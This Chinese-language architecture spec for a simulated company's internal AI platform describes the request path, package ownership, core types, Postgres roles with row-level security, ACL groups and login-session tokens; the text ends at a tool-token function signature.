# 架构与接口规范（中文阅读版）

> 本文是 [architecture.md](architecture.md) 的中文版，章节编号一一对应。英文版是编程代理使用的权威规范，两者有出入时以英文版为准。中文版多了一些“为什么”的说明（用 💡 标出），以及文末的“实现说明”。
>
> 设计背景见 [design-review.md](design-review.md)（为什么要这样设计）和 [decisions.md](decisions.md)（已确定的决定）；工程约定见 [ENGINEERING.md](ENGINEERING.md)。

**常用术语**（全文统一这样叫）：
- 用户身份（Principal）：代码里代表“以谁的身份做事”的对象，可以是真人，也可以是服务账号。
- 演示身份（persona）：用 `persona_key` 标出的固定演示用户（共 14 个，见 §15），演示登录和测试都用它们。
- 数据标签（Label）：附在数据上的级别、ACL 组、可信度和来源（见 §3）。
- 级别（Level，L1–L4）：数据的敏感级别；clearance 是一个人能看的最高级别。
- 风险档（tier，1–3）：工具的风险等级，和数据级别无关：1 只读，2 内部可撤销的写操作，3 对外或不可逆的写操作（四眼审批）。
- 会话（thread）：一次连续的对话；登录状态另称“登录会话”。
- 事务变量（`app.*`）：`principal_tx` 在一次数据库事务里设置的身份信息（user_id、组、clearance 等），RLS 靠它判断，事务结束即清空。
- 高水位（hwm）：本会话到目前为止碰到过的最高级别，只升不降，是选线路时的级别下限（网关再和本次消息的内容级别取较大值）。
- fail-closed：出错时按最严的情况处理（拒绝或只走 local），绝不放行。
- 信封（envelope）：MCP 工具统一的返回格式，数据外面附带标签。
- 提议（proposal）：写操作先生成的待审批请求，批准后才真正执行。
- RLS：Postgres 行级安全；DLP：数据防泄漏检查；MCP：Agent 调用外部工具的标准协议。
- 金丝雀（canary）：故意埋进机密数据的唯一字符串，一旦出现在外发内容里，就说明发生了泄露。

本文是模拟公司 **Kestrelbyte GmbH** 内部 AI 平台的构建规范。这家公司是虚构的：总部在柏林，约 70 人，做 B2B SaaS。本文把设计评审和决定记录落实成具体的包、表和函数签名。本文和代码不一致时，要在同一次修改里把其中一方改对。

> 这里的一切都是模拟的。公司、员工、客户、合同、账务、简历全部由 `corpai/synth` 生成。两条模型线路底层都调用 DeepSeek API，`local` 只是“扮演”公司内网部署的模型。

## 1. 一个请求的完整路径

```text
浏览器（ui/，实时模式下由 API 提供页面）
  │ cookie：登录会话 JWT（HttpOnly，前端 JS 读不到）
  ▼
FastAPI  corpai/api ── 从登录会话解析出用户身份（Principal，经 identity.directory 查目录）
  │ 构造 RunContext(principal, run_id, thread_id, agent, services)  ← 模型写不到这里
  ▼
LangGraph 图  corpai/agents/*
  │  state.sensitivity_hwm（敏感度高水位 hwm：本会话碰到过的最高级别；reducer = max，即合并更新时取较大值，所以只升不降）
  │  每个节点都用 corpai/agents/runtime.py 的三个辅助函数和外界打交道（审批另有 approval_gate，见 §12）：
  │    retrieve(...)   → corpai/rag        （pgvector + 全文检索，RLS，过滤条件来自策略模块）
  │    call_tool(...)  → corpai/mcp_client → 通过 HTTP 调 MCP 服务器（每次换一个短期工具令牌）
  │    llm(...)        → corpai/gateway    （线路由高水位决定，绝不由模型决定）
  ▼                                     │
MCP 服务器 corpai/mcp_servers/<domain>     │
  校验令牌的 aud/exp/scope → policy.decide() → 在 principal_tx 里查询（RLS 生效）
  → 返回带 Label（数据标签：级别、ACL 组、可信度、来源）的结果“信封” → 写审计
  写操作工具 → 生成提议（风险档 2/3）→ 人工审批 → 执行器 → 写入模拟系统
                                        ▼
                         模型网关：local | external（fail-closed、DLP、审计、预算）
```

横切模块：`corpai/audit`（只追加、哈希链防篡改的审计日志，链头另存锚点到数据库之外）、`corpai/trace`（调用链记录，按级别脱敏）、`corpai/classify`（数据标签里的级别、内容检测、DLP、密钥清除）。

💡 **核心思想**：用户身份和敏感级别都由代码掌握，并沿着请求一路传下去。模型只能“提出”要做什么，不能决定“以谁的身份做”“发到哪条线路”。这样一次误判或一段注入指令，最多让模型说错话，而拿不到越权的数据，也发不出数据。

## 2. 包结构与归属

整个项目是一个 Python 包 `corpai/`，放在仓库根目录（不用 `src/` 布局）。下表每一行归一个开发流负责（开发流：一条可以并行推进的开发分工。A1–A5 是底层模块，B1–B4 是建在它们之上的 RAG、MCP、图和界面，M1–M4 是按业务场景划分的里程碑）。其他开发流只能导入它的公开接口，不能改它的文件。

| 路径 | 负责的开发流 | 公开接口（别人只导入这些） |
|---|---|---|
| `corpai/types.py`、`corpai/clock.py`、`corpai/config.py`、`corpai/db/pg.py`、`corpai/ids.py` | **核心（冻结）** | 见 §3、§4；要改先改规范 |
| `corpai/db/migrate.py`、`migrations/000`、`migrations/020` | **核心（冻结）** | `apply_migrations(conn) -> list[str]` |
| `migrations/001_a1_audit_log.sql`、`migrations/002_a1_trace_spans.sql` | A1 数据库 | — |
| `corpai/audit/` | A1 数据库 | `record`、`arecord`、`record_owner_job`、`read_log`、`verify_chain`、`verify_chain_sql`、`read_anchors`、`write_anchor`、`AnchorError`、`EVENTS` |
| `corpai/trace/` | A1 数据库 | `tracer.span(...)`、`Tracer`、`read_run`、`read_meta`、`dept_stats` |
| `corpai/classify/`、`config/sources.yaml` | A2 分级 | `classify_text`、`source_default`、`scrub_secrets`、`dlp_scan`、`mask_for_level`、`redact_protected`、`load_gazetteer(_from_db)`、`gazetteer_size`、`GazetteerError` |
| `corpai/identity/`、`migrations/021_a3_sessions.sql`、`migrations/022_a3_personas.sql`、`config/agents.yaml` | A3 身份 | `directory.get_principal(_sync)`、`directory.list_personas(_sync)`、`groups.effective_groups`、`tokens.*` |
| `corpai/policy/` | A3 身份 | `decide`、`rag_filter`、`tool_allowed`、`can_approve`、`ProposalView`、`RagFilter`、`may_start`、`apps_for`、`tool_tier` |
| `corpai/gateway/`、`config/models.yaml`、`config/egress.yaml`、`migrations/010_a4_ops_gateway.sql` | A4 网关 | `ModelGateway.chat`、`get_gateway`、`FakeLLM`/`fake_llm`、`ops.*`、`egress.*`、`openai_compat.router` |
| `corpai/synth/`、`corpai/cli/synth.py`、`migrations/040_synth_crm.sql` … `045_synth_eval.sql` | A5 模拟公司 | `python -m corpai synth`、`synth.run`、`synth.generate`、`PERSONAS`、`synth.planted`（埋入问题的标准答案） |
| `corpai/embed/`、`corpai/rag/`、`migrations/030-039` | B1 RAG | `ingest_document`、`retrieve` |
| `corpai/mcp_servers/`、`corpai/mcp_client.py` | B2 MCP | `build_server(domain)`、`McpClient.call` |
| `corpai/proposals/`、`migrations/060-069` | B2 MCP | `proposals.create/approve/reject/execute` |
| `corpai/metrics/`、`config/metrics.yaml`、`migrations/070-079` | M3 | `get_metric`、`refresh_snapshots` |
| `corpai/agents/runtime.py`、`corpai/agents/router.py`、`corpai/agents/qa.py` | B3 图 | `RunContext`、`BaseState`、`llm`、`call_tool`、`retrieve`、`approval_gate` |
| `corpai/agents/legal/`、`corpai/agents/report/`、`corpai/agents/sales/`、`corpai/agents/hr/` | M2 / M3 / M4 | 各自一个 `build_graph()` |
| `corpai/playbooks/`、`playbooks/*.yaml` | B3 图 | `load_playbook(id)` |
| `corpai/api/` | B3 图（各里程碑在自己的 `routes_<x>.py` 里加路由） | `create_app()` |
| `ui/` | B4 界面 | 静态文件 |
| `tests/<area>/`、`evals/<usecase>/` | 负责该领域的开发流；`tests/integration/` 放跨开发流的约定测试 | — |
| `compliance/`、`docs/` | 文档流 | — |

命令行：`python -m corpai <命令>` 分派到 `corpai/cli/<命令>.py`（每个模块提供 `main(argv) -> int`）。目前有 `db up|down|status|reset` 和 `synth`。

💡 这样划分是为了让多个编程代理能**同时**开发而不互相踩文件。冻结的核心是所有人共用的“接口约定”，改动成本最高，所以先写好、测好，再并行开发。

## 3. 核心类型（冻结）

`corpai/types.py` 是全项目共用的词汇表。所有开发流都从这里导入，谁也不重新定义。

```python
class Level(IntEnum):        L1 = 1; L2 = 2; L3 = 3; L4 = 4          # 公开 / 内部 / 机密 / 绝密
class Dept(StrEnum):         SALES, ENG, LEGAL, FINANCE, HR, EXEC, IT   # 值："sales","eng","legal","finance","hr","exec","it"
class Role(StrEnum):         EMPLOYEE, MANAGER, CEO, PLATFORM_ADMIN, SECURITY_AUDITOR, SERVICE
class Route(StrEnum):        LOCAL = "local"; EXTERNAL = "external"
class Trust(StrEnum):        REVIEWED, INTERNAL, UNTRUSTED             # 可信度：已审核 > 内部 > 不可信
class Action(StrEnum):       READ, SEARCH, PROPOSE, APPROVE, EXECUTE, EXPORT, ADMIN
class ToolTier(IntEnum):     READ = 1; INTERNAL = 2; EXTERNAL = 3       # 工具风险档 tier：1 只读 / 2 内部可撤销 / 3 对外或不可逆 → 四眼审批（必须由请求人以外的另一个人批准）

@dataclass(frozen=True) class Principal:      # 用户身份：真人用户或服务账号
    user_id: str                    # "u0001"；服务账号是 "svc:<任务名>"
    name: str
    email: str
    dept: Dept
    role: Role
    title: str
    manager_id: str | None
    clearance: Level                # 能看的最高级别（上限）；能不能看具体某行还要看 ACL 组
    groups: frozenset[str]          # 有效 ACL 组，由身份模块计算（见 §5）
    active: bool = True

@dataclass(frozen=True) class Label:          # 数据标签：级别 + 谁能读（ACL 组）+ 可信度 + 来源
    level: Level
    dept: Dept | None = None
    owner_id: str | None = None
    acl_groups: frozenset[str] = frozenset()  # 哪些组的人可以读
    trust: Trust = Trust.INTERNAL
    subject_ids: frozenset[str] = frozenset()   # GDPR 数据主体（员工 / 联系人 / 候选人 id），删除个人数据时用
    sources: tuple[str, ...] = ()               # 来源引用 "kind:id"，例如 "crm.account:A-0012"

@dataclass(frozen=True) class Resource:       # 被访问的资源
    kind: str                       # 资源种类，清单见 §6
    id: str | None
    label: Label
    attrs: Mapping[str, Any] = {}   # 例如 {"project_id": "P-03", "status": "published"}

@dataclass(frozen=True) class Decision:       # 策略模块的决定
    allow: bool
    rule_id: str                    # 是哪条规则做出的决定；都没匹配时是 "default-deny"
    reason: str
    field_mask: frozenset[str] = frozenset()     # 调用方必须去掉的字段
    obligations: frozenset[str] = frozenset()    # 附加义务，例如 {"aggregate_only", "min_group_5", "watermark"}
```

- `corpai/clock.py`：`today() -> date` 返回模拟日期（`settings().sim_today`，即环境变量 `CORPAI_SIM_TODAY`，默认 **2026-10-01**）。业务逻辑从不调用 `date.today()` 或 `datetime.now()` 取业务日期；日志时间戳用 `clock.now_utc()`。
  💡 日期固定，“下个月到期的合同”这类埋入问题（故意放进模拟数据、让评测去发现的业务异常，见 §15）每次运行的答案才一样，评测才可重复。
- **两个时钟**：模拟日期只用于业务数据（到期日、合同到期、“下个月”）。安全控制一律用真实时间：授权到期（`core.principal_row()` 里拿 `core.grants.expires_at` 和数据库的 `now()` 比较）、登录会话和令牌的过期、token 预算的“天”（§8）、审计和 trace 的时间戳。所以模拟数据里的授权，到期时间必须晚于演示实际运行的真实日期（synth 的演示授权到 2027-12-31 才过期）。
  💡 模拟日期是固定的，还能用环境变量改。如果预算按模拟日计，预算永远翻不到第二天；如果授权到期按模拟日判断，改一下 `CORPAI_SIM_TODAY` 就能让过期的授权“复活”。安全相关的时间不能交给一个可以随手改的配置。
- `corpai/ids.py`：`new_id(prefix) -> str`，生成 `run_…`、`prop_…`、`span_…` 这类 id，类似 ULID，按时间可排序。
- `corpai/config.py`：`settings()` 返回缓存的 `Settings`（字段：`data_dir`、`pg_dir`、`secrets_dir`、`corpus_dir`、`cache_dir`、`llm_mode`、`embed_mode`、`demo_login`、`api_base`、`sim_today`）；`load_yaml(name)` 读取 `config/<name>.yaml`；测试用 `reload_settings()` 重新加载。可以用环境变量覆盖：

| 环境变量 | 默认值 | 含义 |
|---|---|---|
| `CORPAI_DATA_DIR` | `.data` | 数据库数据（`<dir>/pg`）、密钥文件（`<dir>/secrets`）、文档语料（`<dir>/corpus`）、审计锚点（`<dir>/audit_anchors.jsonl`）；测试用 `.data/test/<进程号>` |
| `CORPAI_LLM` | `fake` | `fake`（假模型）或 `live`（真的调用 DeepSeek） |
| `CORPAI_EMBED` | `fake` | `fake`（哈希向量）或 `fastembed`（真 embedding 模型） |
| `CORPAI_DEMO_LOGIN` | `1` | 演示用的身份切换开关；每次切换都写审计 |
| `CORPAI_API_BASE` | `http://127.0.0.1:8000` | MCP 服务器和网关的地址 |
| `CORPAI_SIM_TODAY` | `2026-10-01` | 模拟日期 |

## 4. 数据库

**数据库引擎**：pgserver（一个 pip 包，内嵌 Postgres 16 + pgvector），数据目录是 `settings().pg_dir`。`corpai/db/pg.py`（冻结，测试在 `tests/core/`）负责它的启停和连接。所有连接返回 dict 形式的行（`dict_row`）：

```python
def ensure_server(data_dir: Path | None = None) -> str   # 启动或连上已运行的实例；返回表主人的连接串；可重复调用
def stop_server(data_dir: Path | None = None) -> None    # pg_ctl stop -m fast（Windows 上 pgserver 的 cleanup() 不会停掉进程）
def owner_dsn() -> str;  def app_dsn() -> str;  def superuser_dsn() -> str   # 超级用户：只用于初始化和测试清理
def connect_owner(*, autocommit=False) -> psycopg.Connection   # 同步；用于迁移、生成数据、导入、测试
def connect_app(*, autocommit=False) -> psycopg.Connection     # 应用角色但没设身份：什么都看不到（测试专门验证这一点）
def install_app_pool(pool) -> None                 # API 启动时装上连接池 AsyncConnectionPool(app_dsn(), kwargs={'row_factory': dict_row})
def app_pool() -> AsyncConnectionPool | None       # 已装上的连接池；不在 API 进程里时是 None
@asynccontextmanager
async def app_tx() -> AsyncIterator[AsyncConnection]
    # 以 corpai_app 开一个事务，但不设任何身份（装了连接池就用池）；只用来调用那些在还没有身份、
    # 或根本不需要身份时运行的 SECURITY DEFINER 入口：查用户身份、登录会话、宕机开关
@asynccontextmanager
async def principal_tx(principal: Principal, *, run_id: str | None = None) -> AsyncIterator[AsyncConnection]
    # 开一个事务，并设置事务变量 set_config('app.user_id'|'app.role'|'app.dept'|'app.groups'|'app.clearance'|'app.run_id', v, true)
    # 停用账号 → 组为空、clearance 为 0；组名里有逗号 → ValueError
def principal_tx_sync(principal, *, run_id=None) -> ContextManager[Connection]   # 同上，同步版（脚本 / 测试用）
```

💡 `app_tx` 解决的是“先有鸡还是先有蛋”：要查出用户身份得先连数据库，可这时还没有身份。它用应用角色连接、不设任何事务变量，所以普通表一行也看不到，只能调用专门授权的那几个 SECURITY DEFINER 函数。

**两个数据库角色**

| 角色 | 谁用 | 权限 |
|---|---|---|
| `corpai_owner` | 迁移、生成模拟数据、文档导入、指标快照刷新、提议执行器 | 所有表的主人；作为主人绕过 RLS |
| `corpai_app` | 所有请求路径（API、MCP 服务器、LangGraph 图） | 不是超级用户，不能绕过 RLS；只有被明确授予的增删改查权限；RLS 生效 |

表主人的连接串只交给上面这几类后台任务（迁移、生成模拟数据、文档导入、指标快照刷新、提议执行器），外加三个表主人一侧的辅助函数：人名词典加载（`classify.load_gazetteer_from_db()`）、`audit.write_anchor()` 和 `audit.verify_chain()`/`verify_chain_sql()`；请求路径上的其他代码永远拿不到。生成模拟数据、文档导入（`rag.ingest_corpus`）和提议执行器会写一条审计事件（`audit.record_owner_job`），指标快照刷新也必须这样做；迁移（`apply_migrations`，由 `db up`、`synth` 和 `ingest` 运行）和这三个辅助函数不写。

💡 **为什么要两个角色**：Postgres 的行级安全（RLS）对超级用户和带 BYPASSRLS 属性的角色永远不生效；对表主人默认也不生效（除非对表执行 FORCE ROW LEVEL SECURITY）。所以应用角色既不能是表主人，也必须是 NOSUPERUSER NOBYPASSRLS。如果应用用表主人身份连接，RLS 就形同虚设。所以应用用一个“不是主人”的角色连接，RLS 才是真正的最后一道防线：哪怕应用代码漏写了 WHERE 条件，数据库也不会返回无权看的行。

**Schema（命名空间）**：`core`（员工目录、授权、登录会话）、`audit`、`trace`、`rag`、`crm`、`eng`、`legal`、`fin`、`hr`、`ops`（提议、发件箱、出口日志、宕机开关、预算和预算预留）、`metrics`、`synth`（评测答案：埋入的问题、金丝雀；只有表主人能读）、`lg`（LangGraph 的 checkpoint）。

**标签列**。每一行业务数据都带这几列：

```sql
level        smallint NOT NULL CHECK (level BETWEEN 1 AND 4),
dept         text,
owner_id     text,
acl_groups   text[]   NOT NULL CHECK (cardinality(acl_groups) > 0),   -- 空 ACL 直接拒绝
trust        text     NOT NULL DEFAULT 'internal' CHECK (trust IN ('reviewed','internal','untrusted')),   -- hr.candidates 默认 'untrusted'
subject_ids  text[]   NOT NULL DEFAULT '{}'
```

有些表本来就有业务上的 `dept` 列（成本中心、员工所在部门、用人部门：`fin.journal_entries`、`fin.budgets`、`hr.employees`、`hr.requisitions`），这一列同时就是标签的 `dept`。

**标准 RLS 策略**（辅助函数在 `core` 里，由迁移 000 创建）：

```sql
core.cur_groups()    -- 把事务变量 app.groups 按逗号拆成数组；没设置时是空数组
core.cur_clearance() -- 事务变量 app.clearance；没设置时是 0
core.cur_user()      -- 事务变量 app.user_id
core.cur_role(), core.cur_dept(), core.cur_run()   -- 事务变量 app.role、app.dept、app.run_id

ALTER TABLE x ENABLE ROW LEVEL SECURITY;   -- 不用 FORCE：表主人（后台任务、SECURITY DEFINER 函数）必须能绕过
CREATE POLICY x_read ON x FOR SELECT TO corpai_app USING (core.can_read(level, acl_groups));
-- core.can_read(level, acl) = level <= 当前用户的 clearance  AND  acl 和当前用户的组有交集
```

RLS 防的是**应用角色**；表主人是受信任的后台任务代码。事务变量没设置时，等于 clearance 为 0、没有任何组，所以在 `principal_tx` 之外的查询什么也看不到（fail-closed）。薪资、绩效这类字段级机密放在单独的表（`hr.compensation`、`hr.performance`），不用“隐藏某几列”的做法，这样只靠 RLS 就能保护它们。

💡 `set_config(..., true)` 里的 `true` 表示“只在当前事务内有效”。事务一结束变量就清空，连接被连接池复用时不会把上一个用户的身份带给下一个请求。

**只有表主人能直接访问的表**（`audit.log`、`core.users/memberships/grants/sessions`、`ops.*`、`synth.*`）：开着 RLS，但没有任何策略，也没给 `corpai_app` 授任何权限。应用只能通过 SECURITY DEFINER 函数访问它们（函数固定 `search_path`，从 `PUBLIC` 收回 `EXECUTE`，再逐个授权给 `corpai_app`）。代表某个用户身份做事的函数从事务变量里取调用者身份，从不信任参数（`ops.consume_budget(p_dept, …)` 收部门参数只是为了核对它等于 `app.dept`）。例外是还没有用户身份时运行的身份函数：`core.principal_row(p_user_id)` 和 `core.session_open/session_check/session_revoke(p_sid, p_user_id)` 在用户身份建立之前运行，所以 user id 只能作为参数传入（`session_revoke` 只作用于完全对得上的那一对 (sid, user)）。有特权的函数同时检查角色**和**对应的 `role:<x>`（或 `head:<d>`）组；会改状态的还要求 `cur_clearance() > 0`。这样伪造的 `app.role`、已停用的用户身份都会被拒绝。

💡 SECURITY DEFINER 函数按函数主人（也就是表主人）的权限运行，相当于在 RLS 这堵墙上开一扇小门；门开在哪、谁能过，全写在函数里。为什么既查角色又查组：只看 `app.role`，一处代码把它设错就会放行；组是身份模块从目录算出来的，两个都对上才算数。停用账号在 `principal_tx` 里 clearance 被设成 0，`cur_clearance() > 0` 正好把它挡在会改状态的函数外面。

**迁移**：文件名格式 `migrations/NNN_<开发流>_<名字>.sql`（例如 `001_a1_audit_log.sql`、`021_a3_sessions.sql`、`040_synth_crm.sql`），由 `corpai/db/migrate.py` 按编号顺序执行，记录在 `core.schema_migrations`。各开发流的编号段：

| 编号 | 归属 | 内容 |
|---|---|---|
| 000 | 核心 | schema 和 `core.can_read` 等辅助函数 |
| 001–009 | A1 | 001 审计、002 trace |
| 010–019 | A4 | 010 ops：开关、预算、出口日志 |
| 020 | 核心 | 员工目录：`core.users`、`core.memberships`、`core.grants`、`core.principal_row()` |
| 021–029 | A3 | 021 登录会话、022 演示身份列表 |
| 030–039 | B1 | RAG |
| 040–059 | A5 | 040 CRM、041 技术、042 法务、043 财务、044 HR、045 评测答案 |
| 060–069 | B2 | 提议、发件箱 |
| 070–079 | M3 | 指标层 |
| 080–089 | M2 | 法务 |
| 090–099 | M4 | 销售、HR（091 是唯一的编制人数函数 `hr.headcount_by_dept`） |
| 100–109 | B3 | 100 会话归属 `ops.threads`、101 `audit_read` 事件、102 trace 统计的最小分组 |

迁移是纯 SQL，在不费事的地方写成可重复执行（`IF NOT EXISTS`、`CREATE OR REPLACE`）。每个文件在自己的事务里执行，并连同它的 sha256 记在 `core.schema_migrations` 里。改动一个已经执行过的文件会抛 `MigrationError`：要么新加一个迁移，要么用 `python -m corpai db reset --yes` 重置开发数据库。（接线阶段在真实部署之前就地改了 001、044、062、070、091、101，之前建的开发库要先 `db reset --yes`，再 `synth` 和 `ingest`。）建表的迁移必须在同一个文件里写好 `GRANT` 和 RLS 策略。

## 5. 身份、组与令牌（A3）

**目录接口**：`directory.get_principal(user_id) -> Principal | None`（异步）和 `directory.get_principal_sync(user_id)`。两者每次都调用 `core.principal_row()` 重新查（不缓存），未知或格式不对的 id 返回 `None`。`directory.list_personas()` / `list_personas_sync() -> list[dict]` 给演示登录用：经 `core.list_personas()` 只返回带 persona_key 的在职用户，键只有 `user_id, name, title, dept, role, persona_key`；`settings().demo_login` 关闭时抛 `DemoLoginDisabled`（`PermissionError` 的子类）。

💡 不缓存是故意的：员工离职、调岗、授权到期之后，下一个请求立刻生效。

**目录表**：
- `core.users`：user_id、name、email、dept、role、title、manager_id、clearance、active（是否在职）、persona_key、country、hired_on；
- `core.memberships`（user_id、grp）：用户和组的关系（项目、案件、招聘岗位、客户）；
- `core.grants`（grant_id、user_id、grp、reason 理由、granted_by 授权人、created_at、expires_at 到期时间、revoked_at 撤销时间、break_glass）：限时授权，例如法务凭工单临时查看某个 CRM 客户，或紧急访问（break-glass）。授权在 `revoked_at IS NULL AND expires_at > now()` 时有效（用真实时间，见 §3）。

应用角色不能直接读这几张表，只能通过 SECURITY DEFINER 函数 `core.principal_row(user_id)` 取到构造用户身份所需的全部信息：用户那一行，加上关系成员、有效的授权、在职的直属下级。

**有效组**（`identity.groups.effective_groups(row) -> frozenset[str]`，`row` 就是 `core.principal_row()` 返回的结构），这是 RLS 唯一能看到的东西：

| 组 | 谁拥有 |
|---|---|
| `all` | 所有在职的真人用户（包括平台管理员、安全审计员这类运维角色） |
| `dept:<d>` | 部门 `d` 的员工和负责人 |
| `head:<d>` | 部门 `d` 的负责人（角色 `manager`）；CEO 持有 `head:exec` |
| `role:ceo`、`role:platform_admin`、`role:security_auditor` | 对应角色 |
| `user:<id>` | 用户本人（表示行的归属，例如销售自己负责的客户） |
| `proj:<id>`、`matter:<id>`、`req:<id>` | 关系成员（项目成员、案件承办人、招聘小组） |
| `mgr-of:<id>` | 在职用户 `<id>` 的直属上级（可看直属下级不含薪资的 HR 信息） |
| `grant:<…>` | `core.grants` 里有效的授权（`grant:crm:<客户id>`、`grant:matter:<案件id>`） |
| `svc:<job>` | 服务账号；它们只有这个组，加上自己的关系成员和授权（没有 `all`，也没有 `user:`） |

停用账号没有任何组。组名里带逗号的直接拒绝。

💡 为什么不许逗号：`app.groups` 是把所有组用逗号拼成的一个字符串，`core.cur_groups()` 再按逗号拆开。组名里要是带逗号，一个组会被拆成两个，凭空多出一个组。

每一行数据的 `acl_groups` 列出谁可以读它。例如销售 `u0031` 负责的一个 CRM 客户：`{user:u0031, head:sales, role:ceo, grant:crm:A-0012}`。

💡 **为什么把一切都归结为“组”**：RLS 策略因此只需要一条通用公式“级别不超过 clearance，且组有交集”。复杂的关系（谁负责哪个客户、谁在哪个项目、谁是谁的上级）都在算组的时候处理好，数据库这一侧就保持简单，不容易写错。

### 5.1 clearance 与 ACL 分配（模拟数据、策略、RLS 三方共同遵守的数据约定）

**clearance**（`core.users.clearance`）：
- CEO 和各部门负责人 → L4；
- 法务、财务、HR 的员工 → L4（他们的日常工作就要接触 L4 数据）；
- 销售、技术、总裁办的员工 → L3；
- 平台管理员、安全审计员、IT 支持 → L2（他们管系统，不看业务内容）；
- 服务账号（`svc:*`）→ L1。

**各类数据的 ACL 组**（落实设计评审第五节的权限矩阵）。模拟数据生成器严格按此写入（`corpai/synth/labels.py`）；策略模块和 RLS 按此读取。

| 数据 | 级别 | `acl_groups` |
|---|---|---|
| 官网页面、新闻稿、已发布的 JD、GDPR 法规库（`legal.regulations`，可信度 `reviewed`） | L1 | `all` |
| 员工手册（包括 HR 手册的各页）、内部制度、模板（`general` 集合） | L2 | `all` |
| 部门内部文档（wiki、运维手册、面试指南、月结流程） | L2 | `dept:<d>`、`head:<d>`、`role:ceo` |
| 销售竞品对比卡（`sales.battlecard`，可信度 `reviewed`） | L3 | `dept:sales`、`head:sales`、`role:ceo` |
| 销售客户计划（`sales.account_plan`） | L3 | 和对应的 CRM 客户相同：`user:<负责的销售>`、`head:sales`、`role:ceo`、`grant:crm:<客户id>` |
| `crm.accounts`、`crm.contacts`、`crm.opportunities`、`crm.interactions`、`crm.quotes` | L3 | `user:<负责的销售>`、`head:sales`、`role:ceo`、`grant:crm:<客户id>` |
| `eng.projects`（阶段级进度） | L3 | `proj:<id>`、`dept:eng`、`head:eng`、`dept:sales`、`role:ceo` |
| `eng.tickets`、`eng.ci_runs`、代码库文档 | L3 | `proj:<id>`、`head:eng` |
| `eng.vulnerabilities`（安全漏洞） | L4 | `head:eng`、`role:ceo` |
| `legal.contracts`（全文和结构化字段） | L3 | `user:<承办律师>`、`head:legal`、`role:ceo` |
| `legal.contract_requests`（销售提交的合同申请，只有状态） | L3 | `user:<提交的销售>`、`head:sales`、`dept:legal`、`head:legal` |
| `legal.clause_library`（条款库） | L3 | `dept:legal`、`head:legal`、`role:ceo` |
| `legal.matters` 和诉讼文件 | L4 | `matter:<id>`、`head:legal`、`grant:matter:<id>`（CEO 只能经这个授权） |
| `fin.journal_entries`、`fin.invoices`、`fin.budgets` | L3 | `dept:finance`、`head:finance`、`role:ceo` |
| `fin.chart_of_accounts`（会计科目表） | L2 | `dept:finance`、`head:finance`、`role:ceo` |
| 财务报表、融资文件 | L4 | `head:finance`、`dept:finance`、`role:ceo` |
| `fin.metric` 指标行（M3） | 已发布 L2；草稿按内容定 | 已发布 `all`；草稿 `dept:finance`、`head:finance`、`role:ceo` |
| 总裁办的董事会汇报 | L4 | `role:ceo`、`dept:exec` |
| `hr.employees`（员工档案，不含薪资） | L3 | `dept:hr`、`head:hr`、`mgr-of:<员工id>` |
| `hr.compensation`、`hr.performance` | L4 | `head:hr` |
| `hr.requisitions`（岗位、人数、状态） | L2 | `dept:hr`、`head:hr`、`head:<用人部门>`、`role:ceo`、`req:<id>` |
| `hr.requisition_budgets` | L3 | `head:hr`、`head:<用人部门>`、`head:finance`、`role:ceo` |
| `hr.candidates`、简历 | L3 | `req:<岗位id>`、`head:hr` |
| `hr.screenings`（筛选证据和决定） | L4（CHECK 约束强制） | `req:<岗位id>`、`head:hr`（写入方没填时由触发器补上） |
| Playbook | 按内容（L2–L3） | `dept:<d>`、`head:<d>`、`role:ceo` |
| 埋了金丝雀的行和文档 | L4 | 保留所在那一行原来的 ACL |

`hr.screenings` 还拒绝没有理由的决定：理由不能为空，`decided_by`、`decided_at` 也必须填（GDPR 第 22 条）。

💡 GDPR 第 22 条要求：对人有重大影响的决定不能完全交给自动化处理。所以每个筛选决定都必须有人署名、写明理由，而且由数据库强制，不靠应用代码自觉。

关系成员：HR 员工（招聘专员）和某岗位的用人经理获得 `req:<id>`；工程师获得所在项目的 `proj:<id>`；案件承办律师获得 `matter:<id>`。演示身份的设定：`sales_staff` 至少负责 3 个客户，`eng_staff` 至少在 1 个项目里，`legal_staff` 至少承办 3 份合同和 1 个案件，`hr_staff` 至少在 1 个招聘岗位上。

**读权限的决定和 RLS 天然一致**：对带标签的数据行，`decide(p, READ|SEARCH, r)` 的规则是“`r.label.level <= p.clearance` 并且 `r.label.acl_groups` 和 `p.groups` 有交集”才允许，除非命中某条拒绝规则（唯一比 RLS 更严的拒绝规则是 §6 的运维角色规则）。`fin.metric` 也属于带标签的种类。没有标签的种类（`audit`、`trace`、`admin.*`、`proposal`、`report`、`hr.aggregate`）由按角色的规则处理。`tests/security/test_permission_matrix_rls.py` 和 `tests/integration/test_foundation.py` 在生成的数据上，对每个演示身份和服务账号核对这一点。

💡 策略模块和 RLS 用的是同一条公式，所以“应用层判断”和“数据库兜底”不会互相打架。唯一允许的差别是平台管理员和安全审计员：策略模块额外拒绝他们读 L3 及以上的数据（纵深防御），所以对这两个角色，策略比 RLS 更严，但绝不会更宽。

**登录会话令牌**：JWT（HS256），密钥在 `$DATA/secrets/session.key`（首次运行时生成，文件权限 0600，不进 git）。包含 `sub`、`sid`、`iat`、`exp`（8 小时，允许 5 秒误差）。放在 cookie `corpai_session` 里，HttpOnly、SameSite=Strict。`sid` 还必须在 `core.sessions`（sid、user_id、created_at、expires_at、revoked_at；只有表主人能直接访问）里处于打开状态，应用通过 `core.session_open/session_check/session_revoke/session_revoke_user` 这几个函数操作它。只有在职的真人用户能开登录会话；登录会话只在那一行打开、没过期、用户仍在职时有效。**每个请求都重新从目录解析用户身份**，所以停用账号立刻生效。

```python
def issue_session(user_id) -> tuple[str, str]          # (jwt, sid)；异步版 aissue_session
def verify_session(jwt) -> SessionClaims               # 签名 + exp + sid 仍打开 + 用户在职；异步版 averify_session
def revoke_session(sid, user_id) -> bool               # 退出登录：只撤销这一对 (sid, user)；异步版 arevoke_session
def revoke_user_sessions(admin: Principal, user_id: str, *, reason: str) -> int
    # 离职或安全事件：只有在职的平台管理员能调用（Python 和 SQL 各查一次；后台任务可以直接调 SQL 函数）；
    # 理由非空的每次尝试都写审计，事件 "login"、动作 "revoke_sessions"，被拒绝的记 decision "deny"
    # （理由为空直接抛 ValueError，不写审计）
```

💡 JWT 一旦签发，在过期前是“自证有效”的，服务端撤不回来。多一张 `core.sessions` 表、每个请求再查一次 sid，退出登录和离职就能立刻生效，代价是每个请求多一次数据库查询。`revoke_session` 只认 (sid, user) 这一对，所以拿到别人的 sid 也踢不掉别人的登录。

**工具令牌和网关令牌**（`identity.tokens`）：

```python
def mint_tool_token(principal: Principal, *, domain: str, agent: str, run_id: str,
                    tools: Iterable[str], ttl_s: int = 60) -> str
